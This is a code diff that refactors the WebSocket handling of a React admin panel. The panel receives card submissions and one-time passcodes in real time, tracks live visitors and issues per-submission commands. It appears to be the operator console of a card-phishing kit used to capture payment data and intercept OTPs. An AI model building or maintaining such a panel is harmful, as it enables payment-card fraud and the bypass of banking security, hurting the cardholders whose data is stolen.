@@ -46,40 +46,33 @@ const AdminPanel = () => {
   };
 
   useEffect(() => {
-    // Initialize WebSocket connection
-    if (!wsClient.socket.connected) {
-      wsClient.connect();
-    }
+    const handleConnect = () => {
+      setConnectionStatus('Connected');
+      console.log('[AdminPanel] WebSocket connected, sending admin_hello.');
+      wsClient.send('admin_hello', {});
+    };
 
-    // Announce to the server that this is an admin client
-    wsClient.send('admin_hello', {});
+    const handleDisconnect = () => {
+      setConnectionStatus('Disconnected');
+      console.log('[AdminPanel] WebSocket disconnected.');
+    };
 
     const handleCardSubmission = (submission: CardSubmission) => {
       console.log('[AdminPanel] Received card_submission:', submission);
-      setCardSubmissions(prev => [{
-        ...submission,
-        isNew: true,
-        created_at: new Date().toISOString()
-      }, ...prev]);
+      setCardSubmissions(prev => [{ ...submission, isNew: true, created_at: new Date().toISOString() }, ...prev]);
       showNotification('New card submission received');
     };
 
-    const handleAdminCommand = (command: any) => {
-      console.log('[AdminPanel] Received admin_command:', command);
-      if (command.submission_id) {
-        setAdminCommands(prev => ({
-          ...prev,
-          [command.submission_id]: [...(prev[command.submission_id] || []), command.command]
-        }));
-      }
+    const handleOtpSubmitted = (data: { submission_id: string; otp: string }) => {
+      console.log('[AdminPanel] Received otp_submitted:', data);
+      setCardSubmissions(prev =>
+        prev.map(s => (s.id === data.submission_id ? { ...s, otp: data.otp } : s))
+      );
     };
 
     const handleVisitorUpdate = (visitor: Visitor) => {
       console.log('[AdminPanel] Received visitor_update:', visitor);
-      setActiveVisitors(prev => {
-        if (prev.find(v => v.id === visitor.id)) return prev;
-        return [...prev, visitor];
-      });
+      setActiveVisitors(prev => (prev.find(v => v.id === visitor.id) ? prev : [...prev, visitor]));
     };
 
     const handleVisitorLeft = (payload: { id: string }) => {
@@ -94,44 +87,60 @@ const AdminPanel = () => {
       showNotification('All transactions deleted');
     };
 
-    const handleOtpSubmitted = (data: any) => {
-      console.log('[AdminPanel] Received otp_submitted:', data);
-      setCardSubmissions(prev =>
-        prev.map(s =>
-          s.id === data.submission_id ? { ...s, otp: data.otp } : s
-        )
-      );
+    const handleAdminCommand = (command: any) => {
+      console.log('[AdminPanel] Received admin_command:', command);
+      if (command.submission_id) {
+        setAdminCommands(prev => ({
+          ...prev,
+          [command.submission_id]: [...(prev[command.submission_id] || []), command.command]
+        }));
+      }
     };
 
+    // Register all event listeners
     wsClient.on('card_submission', handleCardSubmission);
-    wsClient.on('admin_command', handleAdminCommand);
+    wsClient.on('otp_submitted', handleOtpSubmitted);
     wsClient.on('visitor_update', handleVisitorUpdate);
     wsClient.on('visitor_left', handleVisitorLeft);
     wsClient.on('delete_all_transactions', handleDeleteAllTransactions);
-    wsClient.on('otp_submitted', handleOtpSubmitted);
+    wsClient.on('admin_command', handleAdminCommand);
+    wsClient.socket.on('connect', handleConnect);
+    wsClient.socket.on('disconnect', handleDisconnect);
+
+    // Connect if not already connected
+    if (wsClient.socket.connected) {
+      handleConnect();
+    } else {
+      wsClient.connect();
+    }
 
     // Set custom favicon for admin panel only
     const favicon = document.createElement('link');
     favicon.rel = 'icon';
     favicon.type = 'image/png';
-    favicon.href = 'https://static.thenounproject.com/png/74031-200.png'; // Example game logo
-    favicon.id = 'admin-favicon';
+    favicon.href = 'https://static.thenounproject.com/png/74031-200.png';
     document.head.appendChild(favicon);
 
+    // Cleanup function
     return () => {
-      if (wsClient.socket.connected) {
-        wsClient.disconnect();
-      }
+      console.log('[AdminPanel] Cleaning up and disconnecting.');
+      // Remove all listeners
       wsClient.off('card_submission', handleCardSubmission);
-      wsClient.off('admin_command', handleAdminCommand);
+      wsClient.off('otp_submitted', handleOtpSubmitted);
       wsClient.off('visitor_update', handleVisitorUpdate);
       wsClient.off('visitor_left', handleVisitorLeft);
       wsClient.off('delete_all_transactions', handleDeleteAllTransactions);
-      wsClient.off('otp_submitted', handleOtpSubmitted);
-      const existingFavicon = document.getElementById('admin-favicon');
-      if (existingFavicon) {
-        existingFavicon.remove();
+      wsClient.off('admin_command', handleAdminCommand);
+      wsClient.socket.off('connect', handleConnect);
+      wsClient.socket.off('disconnect', handleDisconnect);
+
+      // Disconnect the socket
+      if (wsClient.socket.connected) {
+        wsClient.disconnect();
       }
+
+      // Remove favicon
+      document.head.removeChild(favicon);
     };
   }, []);
 
